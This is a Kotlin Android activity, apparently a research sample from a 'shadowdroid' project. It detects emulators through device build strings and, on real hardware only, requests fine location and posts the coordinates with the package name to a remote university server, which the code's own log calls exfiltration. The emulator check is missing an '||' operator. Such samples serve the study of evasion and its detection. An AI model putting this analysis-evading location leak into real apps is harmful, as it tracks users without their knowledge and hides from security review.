package nl.tbethe.shadowdroid.hardwareproperty

import android.Manifest
import android.content.pm.PackageManager
import android.location.Criteria
import android.location.LocationManager
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.request.forms.*
import io.ktor.client.statement.*
import io.ktor.http.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

private const val TAG = "MainActivity"

class MainActivity : AppCompatActivity() {


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // isEmulator
        val isEmu =
            Build.DEVICE.contains(Regex("generic", RegexOption.IGNORE_CASE))
            Build.HARDWARE.contains(Regex("goldfish|ranchu", RegexOption.IGNORE_CASE)) ||
            Build.PRODUCT.contains("sdk") ||
            Build.BOARD.contains(Regex("goldfish", RegexOption.IGNORE_CASE)) ||
            Build.MODEL.contains(Regex("emulator", RegexOption.IGNORE_CASE))

        leakLocationIf (!isEmu)
    }

    private fun leakLocationIf(notAnalyser: Boolean) {
        if (!notAnalyser) return

        fun sendLocation() {
            val lm = getSystemService(LocationManager::class.java)
            val provider = lm.getBestProvider(Criteria(), true)

            val location = provider?.let {
                lm.getLastKnownLocation(it)
            }
            location?.let { loc ->
                val url = "https://vm-thijs.ewi.utwente.nl/shadow-droid/leak?appname="
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        HttpClient(CIO).use { client ->
                            val response = client.submitForm<HttpResponse>(
                                url,
                                Parameters.build {
                                    append("appname", packageName)
                                    append("coords", "${loc.latitude}:${loc.longitude}")
                                },
                                false
                            )
                            Log.d(TAG, "Response status: ${response.status}")
                            Log.d(TAG, "Response: ${response.readText()}")
                        }
                    } catch (e: Exception) {
                        Log.d(TAG, "IO Exception occurred when trying to exfiltrate data")
                    }
                }
            }
        }
        val requestPermission =
            registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
                if (isGranted) sendLocation()
            }
        when (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
            PackageManager.PERMISSION_DENIED -> {
                requestPermission.launch(Manifest.permission.ACCESS_FINE_LOCATION)
            }
            PackageManager.PERMISSION_GRANTED -> {
                sendLocation()
            }
        }
    }
}